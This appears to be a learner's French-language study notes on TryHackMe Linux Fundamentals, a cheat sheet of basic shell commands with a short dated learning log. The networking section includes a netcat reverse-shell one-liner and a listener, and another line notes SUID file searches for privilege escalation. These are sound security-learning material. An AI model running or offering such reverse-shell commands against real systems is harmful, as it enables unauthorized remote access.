# Linux Fundamentals — Notes THM

Rooms complétées : Linux Fundamentals Part 1, 2, 3

---

## Navigation et fichiers

```bash
pwd                          # Dossier actuel
ls -la                       # Lister avec permissions + fichiers cachés
cd /chemin                   # Changer de dossier
find / -name "*.txt"         # Chercher un fichier par nom
find / -perm -4000           # Fichiers SUID (clé pour la privesc)
grep -r "motclé" .           # Chercher du contenu récursivement
grep -i "motclé" fichier     # Insensible à la casse
grep -v "motclé" fichier     # Exclure les lignes qui matchent
cat fichier | grep "terme"   # Filtrer la sortie d'une commande
```

## Permissions Linux

```bash
# Format : rwxrwxrwx  (owner | group | others)
# r = read = 4
# w = write = 2
# x = execute = 1

chmod 755 fichier            # rwxr-xr-x (owner full, group/others r+x)
chmod 644 fichier            # rw-r--r-- (fichiers standards)
chmod +x script.sh           # Rendre exécutable
chown user:group fichier     # Changer le propriétaire

# Bits spéciaux — importants pour la sécurité
# SUID (chmod 4755) : le fichier s'exécute avec les droits du propriétaire
# Si owner = root et SUID activé → exécution en tant que root !
```

## Processus et services

```bash
ps aux                       # Tous les processus en cours
ps aux | grep nginx          # Filtrer par nom de processus
top                          # Processus en temps réel
kill -9 PID                  # Tuer un processus (SIGKILL)
systemctl status ssh         # Statut d'un service
systemctl start ssh          # Démarrer
systemctl stop ssh           # Stopper
```

## Réseau depuis Linux

```bash
ip addr show                 # Interfaces réseau et IPs
ip route show                # Table de routage
ss -tuln                     # Ports en écoute
curl -I http://cible         # Headers HTTP seulement
wget http://cible/fichier    # Télécharger un fichier
nc -lvnp 4444                # Netcat en écoute (listener)
nc cible 4444 -e /bin/bash   # Reverse shell basique
```


## Ce que j'ai appris

### 2026-04-04 — Grep et navigation filesystem
**Commandes qui ont marché :**
- `cd /dossier` puis `cat note.txt`
- `grep THM access.log`

**Erreurs faites :**
- `grep access.log` → oublié le pattern avant le fichier
- `find note.txt` → oublié le chemin de départ

**À retenir :**
- grep : toujours PATTERN avant FICHIER
- find : toujours un chemin de départ `/`
- Logs compressés → `zgrep` au lieu de `grep`
